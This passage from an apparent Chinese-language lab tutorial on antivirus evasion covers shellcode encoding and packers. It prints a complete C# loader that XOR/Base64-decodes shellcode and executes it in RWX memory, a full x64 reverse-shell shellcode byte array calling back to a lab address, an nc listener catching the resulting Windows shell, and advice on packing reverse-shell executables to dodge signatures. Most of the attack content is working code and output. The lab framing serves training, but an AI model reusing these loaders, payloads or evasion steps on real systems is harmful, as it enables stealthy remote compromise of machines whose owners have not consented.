<span class="hljs-selector-id">#Compiling</span> and running our custom CSharp encode
#我们将得到经过编码之后的Shellcode内容。
C:\&gt; csc.exe Encryptor.cs
C:\&gt; .\Encryptor.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=</code></pre>
<h2 id="自解码有效载荷">自解码有效载荷</h2>
<p>现在我们有了一个已编码的有效载荷，我们需要继续调整我们用于加载最终Shellcode的代码(此代码会将Shellcode加载到内存并执行)，以便该代码文件在执行之前能够解码Shellcode。</p>
<p>为了与编码器进行匹配，我们将会以和编码器相反的顺序解码所有内容，因此，我们首先将解码Base64内容，然后继续使用我们在编码器中所使用过的相同密钥来对解码结果进行XOR处理。</p>
<p>下面是完整的Payload代码(可加载Shellcode到内存并执行)，该文件可在目标Windows机器中的以下路径找到：<code>C:\Tools\CS Files\EncStageless.cs</code></p>
<pre><code class="hljs cs"><span class="hljs-comment">//在目标Windows机器中创建该代码文件</span>
<span class="hljs-comment">//EncStageless.cs</span>
<span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.Net;
<span class="hljs-keyword">using</span> System.Text;
<span class="hljs-keyword">using</span> System.Runtime.InteropServices;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span> {
  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;

  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span>(<span class="hljs-params">UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="hljs-keyword">ref</span> UInt32 lpThreadId</span>)</span>;

  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">WaitForSingleObject</span>(<span class="hljs-params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;

  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 MEM_COMMIT = <span class="hljs-number">0x1000</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="hljs-number">0x40</span>;
  
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">xor</span>(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] shell, <span class="hljs-built_in">byte</span>[] KeyBytes</span>)</span>
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            <span class="hljs-keyword">return</span> shell;
        }
  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span>
  {

    <span class="hljs-built_in">string</span> dataBS64 = <span class="hljs-string">"qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE="</span>;
    <span class="hljs-built_in">byte</span>[] data = Convert.FromBase64String(dataBS64);

    <span class="hljs-built_in">string</span> key = <span class="hljs-string">"THMK3y123!"</span>;
    <span class="hljs-comment">//Convert Key into bytes</span>
    <span class="hljs-built_in">byte</span>[] keyBytes = Encoding.ASCII.GetBytes(key);

    <span class="hljs-built_in">byte</span>[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(<span class="hljs-number">0</span>, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, <span class="hljs-number">0</span>, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = <span class="hljs-number">0</span>;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, codeAddr, parameter, <span class="hljs-number">0</span>, <span class="hljs-keyword">ref</span> threadId);

    WaitForSingleObject(threadHandle, <span class="hljs-number">0xFFFFFFFF</span>);

  }
}</code></pre>
<p>注意：在实际使用时，我们需要用我们之前在执行编码器时所得到的内容填充上述代码中的<code>dataBS64</code>变量。</p>
<p>tips：我们只是组合了一些在单独使用时会被AV所检测到的非常简单的技术(XOR、Base64…)。</p>
<p>最后让我们在目标Windows机器上使用以下命令编译Payload：</p>
<pre><code class="hljs scss">#在目标Windows机器中
<span class="hljs-selector-id">#Compile</span> Our Encrypted Payload
C:\&gt; csc.exe EncStageless.cs</code></pre>
<p>编译成功之后，我们就可以得到一个可执行的Payload文件了，在正式执行该Payload文件之前，我们还需要在AttackBox机器的终端设置一个nc监听器：</p>
<pre><code class="hljs scss">#在AttackBox机器中
<span class="hljs-selector-id">#Set</span> Up nc Listener
user<span class="hljs-keyword">@AttackBox</span>$ nc -lvp <span class="hljs-number">443</span>
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">443</span>)
Connection from ip-<span class="hljs-number">10</span>-<span class="hljs-number">10</span>-<span class="hljs-number">139</span>-<span class="hljs-number">83</span>.eu-west-<span class="hljs-number">1</span>.compute.internal <span class="hljs-number">49817</span> received!
Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

<span class="hljs-attribute">C</span>:\Windows\System32&gt;</code></pre>
<p>在大多数时候，我们在网上找到的一些特定规避方法都可能无法成功使用，因为AV软件针对这些方法的检测签名可能已经存在。这就需要我们发挥一定想象力来定制方法以成功绕过常规的AV检测。</p>
<pre><code class="hljs scss">byte<span class="hljs-selector-attr">[]</span> buf = new byte<span class="hljs-selector-attr">[460]</span> {<span class="hljs-number">0</span>xfc,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x83,<span class="hljs-number">0</span>xe4,<span class="hljs-number">0</span>xf0,<span class="hljs-number">0</span>xe8,
<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x51,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x51,<span class="hljs-number">0</span>x56,<span class="hljs-number">0</span>x48,
<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xd2,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x60,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x18,<span class="hljs-number">0</span>x48,
<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x72,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x0f,<span class="hljs-number">0</span>xb7,<span class="hljs-number">0</span>x4a,<span class="hljs-number">0</span>x4a,
<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>xac,<span class="hljs-number">0</span>x3c,<span class="hljs-number">0</span>x61,<span class="hljs-number">0</span>x7c,<span class="hljs-number">0</span>x02,<span class="hljs-number">0</span>x2c,
<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x0d,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>xe2,<span class="hljs-number">0</span>xed,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x41,
<span class="hljs-number">0</span>x51,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x42,<span class="hljs-number">0</span>x3c,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd0,<span class="hljs-number">0</span>x8b,
<span class="hljs-number">0</span>x80,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x85,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x74,<span class="hljs-number">0</span>x67,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x01,
<span class="hljs-number">0</span>xd0,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x18,<span class="hljs-number">0</span>x44,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd0,
<span class="hljs-number">0</span>xe3,<span class="hljs-number">0</span>x56,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x34,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd6,
<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>xac,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x0d,<span class="hljs-number">0</span>x41,
<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>x38,<span class="hljs-number">0</span>xe0,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>xf1,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x03,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>x08,<span class="hljs-number">0</span>x45,
<span class="hljs-number">0</span>x39,<span class="hljs-number">0</span>xd1,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>xd8,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x44,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd0,
<span class="hljs-number">0</span>x66,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x0c,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x44,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>x1c,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd0,
<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x04,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd0,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x5e,
<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x83,<span class="hljs-number">0</span>xec,<span class="hljs-number">0</span>x20,
<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xe0,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x12,<span class="hljs-number">0</span>xe9,
<span class="hljs-number">0</span>x57,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>x5d,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xbe,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>x73,<span class="hljs-number">0</span>x32,<span class="hljs-number">0</span>x5f,<span class="hljs-number">0</span>x33,
<span class="hljs-number">0</span>x32,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x56,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe6,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x81,<span class="hljs-number">0</span>xec,<span class="hljs-number">0</span>xa0,
<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe5,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xbc,<span class="hljs-number">0</span>x02,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x15,<span class="hljs-number">0</span>xb3,
<span class="hljs-number">0</span>x0a,<span class="hljs-number">0</span>x0a,<span class="hljs-number">0</span>x4f,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x54,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe4,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xf1,
<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>x26,<span class="hljs-number">0</span>x07,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xea,<span class="hljs-number">0</span>x68,
<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x29,<span class="hljs-number">0</span>x80,<span class="hljs-number">0</span>x6b,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>xff,
<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xc0,
<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xc2,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>xea,
<span class="hljs-number">0</span>x0f,<span class="hljs-number">0</span>xdf,<span class="hljs-number">0</span>xe0,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xc7,<span class="hljs-number">0</span>x6a,<span class="hljs-number">0</span>x10,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x58,
<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe2,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xf9,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x99,<span class="hljs-number">0</span>xa5,<span class="hljs-number">0</span>x74,<span class="hljs-number">0</span>x61,
<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x81,<span class="hljs-number">0</span>xc4,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>x02,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xb8,<span class="hljs-number">0</span>x63,
<span class="hljs-number">0</span>x6d,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x48,
<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe2,<span class="hljs-number">0</span>x57,<span class="hljs-number">0</span>x57,<span class="hljs-number">0</span>x57,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x6a,<span class="hljs-number">0</span>x0d,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x41,
<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>xe2,<span class="hljs-number">0</span>xfc,<span class="hljs-number">0</span>x66,<span class="hljs-number">0</span>xc7,<span class="hljs-number">0</span>x44,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>x54,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8d,
<span class="hljs-number">0</span>x44,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>x18,<span class="hljs-number">0</span>xc6,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x68,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe6,<span class="hljs-number">0</span>x56,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x41,
<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xff,
<span class="hljs-number">0</span>xc8,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x79,<span class="hljs-number">0</span>xcc,<span class="hljs-number">0</span>x3f,
<span class="hljs-number">0</span>x86,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xd2,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xca,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x0e,<span class="hljs-number">0</span>x41,
<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x08,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x1d,<span class="hljs-number">0</span>x60,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>xbb,<span class="hljs-number">0</span>xf0,<span class="hljs-number">0</span>xb5,<span class="hljs-number">0</span>xa2,<span class="hljs-number">0</span>x56,
<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>xa6,<span class="hljs-number">0</span>x95,<span class="hljs-number">0</span>xbd,<span class="hljs-number">0</span>x9d,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x83,<span class="hljs-number">0</span>xc4,<span class="hljs-number">0</span>x28,
<span class="hljs-number">0</span>x3c,<span class="hljs-number">0</span>x06,<span class="hljs-number">0</span>x7c,<span class="hljs-number">0</span>x0a,<span class="hljs-number">0</span>x80,<span class="hljs-number">0</span>xfb,<span class="hljs-number">0</span>xe0,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>x05,<span class="hljs-number">0</span>xbb,<span class="hljs-number">0</span>x47,<span class="hljs-number">0</span>x13,
<span class="hljs-number">0</span>x72,<span class="hljs-number">0</span>x6f,<span class="hljs-number">0</span>x6a,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xda,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5};</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054642.png" alt></p>
<h1 id="0x09-加壳器packers">0x09 加壳器(Packers)</h1>
<p>另一种可以对抗基于磁盘的AV检测的方法是使用加壳器(加壳程序)。加壳器(Packers)是一种软件，它能够将一个程序作为输入并对其进行转换，使这个程序的结构变得看起来不同，但经过处理后的程序的功能还是会和原来保持完全相同。加壳器这样做有两个主要目标：</p>
<ul>
<li>压缩程序，从而使其占用更少的空间；</li>
<li>保护程序免受逆向工程(reverse engineering)的侵害。</li>
</ul>
<p>开发人员通常会使用加壳器来保护其软件免受逆向工程或破解(cracked)的负面影响。加壳器可以通过实现混合转换(压缩、加密、添加调试保护等)来对指定软件做到一定程度上的保护。同样，加壳器也经常可被用于对恶意软件进行混淆处理，以使得恶意软件更难被AV所检测到。</p>
<p>市面上有相当多的加壳器(Packers)，包括<a target="_blank" rel="noopener" href="https://github.com/upx/upx">UPX</a>、MPRESS、Themida等。</p>
<h2 id="对应用程序进行加壳">对应用程序进行加壳</h2>
<p>虽然每个加壳器(Packers)的操作方式都不同，但是让我们查看一下简单的加壳器的基本操作示例。</p>
<p>当应用程序被加壳时，它将通过加壳函数以某种方式被转换。加壳函数需要能够混淆和转换应用程序的原始代码，并且这种混淆和转换方式可以通过脱壳函数进行合理地逆转，以便保留应用程序的原始功能。虽然有时候加壳器可能会添加一些代码(例如，添加一些能够使调试应用程序更加困难的代码)，但是它通常会希望能够在应用程序执行时恢复其原始代码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054643.png" alt></p>
<p>应用程序的加壳版本将包含我们的被加壳的应用程序代码，由于这个新的被加壳的代码已经被混淆，因此应用程序需要能够经过脱壳得到原始代码。为此，加壳器将向加壳版本的应用程序嵌入一个包含脱壳器的代码存根，并将相关可执行文件的主要入口点重定向到脱壳器。</p>
<p>当加壳版本的应用程序被执行时，将会发生以下情况：</p>
<ol>
<li>脱壳器首先会被执行，因为这个可执行文件(应用程序)的入口点指向了它；</li>
<li>脱壳器将读取已加壳的应用程序代码；</li>
<li>脱壳器将经过脱壳得到的原始代码写入到内存中的某个位置，并会将应用程序的执行流指向该位置。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054644.png" alt></p>
<h2 id="加壳器和avs反病毒">加壳器和AVs(反病毒)</h2>
<p>现在，我们可以看到加壳器如何帮助绕过AV解决方案。假设我们构建了一个反向shell可执行文件，但是它会被反病毒软件标记为恶意软件，因为该可执行文件会与已知签名相匹配；在这种情况下，我们可以使用加壳器来转换我们得到的反向shell可执行文件，从而使其在目标计算机磁盘上不匹配任何已知签名。</p>
<p>然而，AV解决方案仍然可以捕获已加壳的应用程序(此处指加壳的反向shell可执行文件)，原因如下：</p>
<ul>
<li>虽然可执行文件的原始代码可能会转换为AV无法识别的内容，但是加壳版本的可执行文件会包含带有脱壳器的代码的存根；如果脱壳器具有已知签名，那么反病毒解决方案仍然可能根据脱壳器存根来标记任何已加壳的可执行文件。</li>
<li>在某些时候，我们得到的已加壳可执行文件会将其原始代码脱壳到内存中，以便可以执行它；如果我们所尝试绕过的反病毒解决方案可以进行内存扫描，那么代码在脱壳之后仍然可能会被检测到。</li>
</ul>
<h2 id="对我们的shellcode进行加壳">对我们的shellcode进行加壳</h2>
<p>让我们从基本的C# shellcode开始，相关的完整代码如下：</p>
<p>tips：该代码文件可以在目标Windows计算机中找到，相关路径为<code>C:\Tools\CS Files\UnEncStagelessPayload.cs</code>。</p>
<pre><code class="hljs cs"><span class="hljs-comment">//在目标Windows机器中创建该代码文件</span>
<span class="hljs-comment">//UnEncStagelessPayload.cs</span>
<span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.Net;
<span class="hljs-keyword">using</span> System.Text;
<span class="hljs-keyword">using</span> System.Configuration.Install;
<span class="hljs-keyword">using</span> System.Runtime.InteropServices;
<span class="hljs-keyword">using</span> System.Security.Cryptography.X509Certificates;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span> {
  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;

  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span>(<span class="hljs-params">UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="hljs-keyword">ref</span> UInt32 lpThreadId</span>)</span>;

  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">WaitForSingleObject</span>(<span class="hljs-params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;

  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 MEM_COMMIT = <span class="hljs-number">0x1000</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="hljs-number">0x40</span>;

  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span>
  {
    <span class="hljs-built_in">byte</span>[] shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[] {<span class="hljs-number">0xfc</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x83</span>,...,<span class="hljs-number">0xda</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd5</span> };


    UInt32 codeAddr = VirtualAlloc(<span class="hljs-number">0</span>, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, <span class="hljs-number">0</span>, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = <span class="hljs-number">0</span>;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, codeAddr, parameter, <span class="hljs-number">0</span>, <span class="hljs-keyword">ref</span> threadId);

    WaitForSingleObject(threadHandle, <span class="hljs-number">0xFFFFFFFF</span>);

  }
}</code></pre>
